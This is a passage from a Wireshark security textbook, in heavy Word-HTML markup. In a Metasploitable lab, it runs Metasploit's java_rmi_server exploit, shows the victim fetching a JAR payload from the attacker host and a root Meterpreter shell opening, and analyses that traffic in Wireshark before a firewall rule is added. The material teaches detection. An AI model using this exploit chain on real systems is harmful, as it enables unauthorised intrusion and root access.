style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Payload)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:187.0500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:27.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; exploit [*] Started bind handler</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:145.3500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Using URL: http://0.0.0.0:8080/AjmJdixsN [*] Local IP: http://127.0.0.1:8080/AjmJdixsN [*] Connected and sending request for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http://192.168.56.106:8080/A3GyXqDfP25/fewbPDz.jar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:36.9500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java_rmi_server - Replied to request</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for payload</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >JAR</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Sending stage (30355 bytes) to 192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Meterpreter session 4 opened (192.168.56.106:41847 -&#62; 192.168.56.103:4444) at 2014-11-11 19:53:37 -0600</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[+] Target 192.168.56.103:1099 may be exploitable&#8230; [*] Server stopped.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:323.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >meterpreter &#62; getuid Server username: root meterpreter &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The majority of the default settings are kept. The only things we are setting is the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RHOST </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option to the IP address of the Metasploitable VM and the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option to a Java Meterpreter bind TCP shell. The Meterpreter payload is the super shell that provides power for post- exploitation activities. In this case, we use a Java-based Meterpreter&#8212; that is, a Meterpreter shell written in Java. We use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bind_tcp </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >version of the Meterpreter shell. This means that the first stage of the Meterpreter shell binds to a TCP port and waits for the Metasploit Framework to connect and send the rest of the payload code to it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Basically, this means our exploit creates a server on the victim machine (Metasploitable, in this case). We then connect to this server to get a fully functional shell. In this case, we have left the TCP port that Meterpreter binds to as the Metasploit default port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:6.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now that we have run a successful exploit and gotten a shell, let&#8217;s dig into a packet dump. After running Wireshark, the first thing to look at is traffic going over the RMI port (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1099</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). To accomplish this, use the filter </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp.port == 1099</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. When you see the packets you&#8217;re interested in,</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section257" ><p class=MsoBodyText  style="margin-top:3.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >right-click and select Follow </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >TCP Stream, which gives the output shown in<a name="_bookmark498" ></a>&nbsp;</span><span><a href="#_bookmark500" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-12</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="123.75"  height="0" ></td></tr><tr><td></td><td><img width="773"  height="600"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker331441.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark500" ></a><span><a href="#_bookmark498" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-12:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Metasploit RMI data</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Even though you don&#8217;t know about RMI, you can see there is a URL within the TCP data that points back to the attacker machine (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.106</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, in this scenario). Note that this URL is pointing to a randomly named Java JAR (Java Archive) file. The Metasploit Framework performs all this magic behind the scenes, including generating and hosting this JAR file. Note the full URL includes the TCP port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >8080</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now let&#8217;s see if we can track down this HTTP traffic. Because it is over port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >8080</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, include the display filter </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp.port == 8080</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This should present the packets you are interested in. Clicking on one of them and choosing to follow the TCP stream shows the stream content, as shown</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section258" ><p class=MsoBodyText  style="margin-top:3.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in<a name="_bookmark501" ></a>&nbsp;</span><span><a href="#_bookmark502" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-13</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="125"  height="0" ></td></tr><tr><td></td><td><img width="772"  height="602"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker332243.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark502" ></a><span><a href="#_bookmark501" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-13:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Metasploit HTTP JAR data</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark503" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can see that the Metasploitable VM (our victim) has indeed connected to us and downloaded the JAR file. You can check the shell port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in the same manner and see that the Metasploit Framework pushes more Java code. Scroll to the bottom of the Follow TCP Stream window, as shown in<a name="_bookmark504" ></a>&nbsp;</span><span><a href="#_bookmark505" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-14</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, and select Hex Dump to see the back and forth communication for your shell. You can see the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >getuid </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command getting called and returning </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section259" ><p class=MsoBodyText  style="margin-left:10.2500pt;" ><img width="773"  height="660"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker332791.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark505" ></a><span><a href="#_bookmark504" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-14:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Metasploit hex dump</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:8.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should have a pretty solid understanding of how this exploit works. First, it hits the RMI port on </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1099</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which triggers the Metasploit VM to make an HTTP request for a JAR file to the attacker machine. This is the first stage of the Meterpreter shell, which creates a listener on TCP port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Finally, the Metasploit Framework connects to this Meterpreter listener, sends some additional code, and uses the port as the communications channel for the Meterpreter</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shell.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.1500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You are ready to start breaking things and troubleshooting. Often, in the real world, your target machine might have a host-based firewall that restricts inbound packets. Such a firewall would stop your bind shells from connecting. This is replicated on the Metasploitable VM with a firewall rule that blocks TCP port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Later in this section,</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section260" ><p class=MsoBodyText  style="margin-top:3.5500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >you will see in Wireshark that the firewall rule is blocking traffic when you run your exploit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:6.3500pt;" ><a name="_bookmark506" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To log in to the Metasploitable VM, you can use the default credentials of </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msfadmin/msfadmin</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The next step is to run this command to create the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >iptables </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >entry. Before you run this command, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >exit </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in the Meterpreter shell to kill it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Execute the following command to create a firewall rule that blocks TCP port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msfadmin@metasploitable:~$ sudo iptables -A INPUT -i eth0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--destination-port 4444 -j DROP</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You don&#8217;t necessarily need to worry about understanding this command in detail. You just need to know that now the machine blocks any inbound connections on port </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >4444</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now run the exploit again with this new firewall rule in place. This time it hangs for a while before finishing, without dropping you to a Meterpreter shell.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.5000pt;margin-right:187.0500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:27.0000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; exploit [*] Started bind handler</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:11.6500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Using URL: http://0.0.0.0:8080/sLaVQ2sPK</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Local IP:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http://127.0.0.1:8080/sLaVQ2sPK</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Connected and sending request for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7500pt;font-size:12.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:'Courier 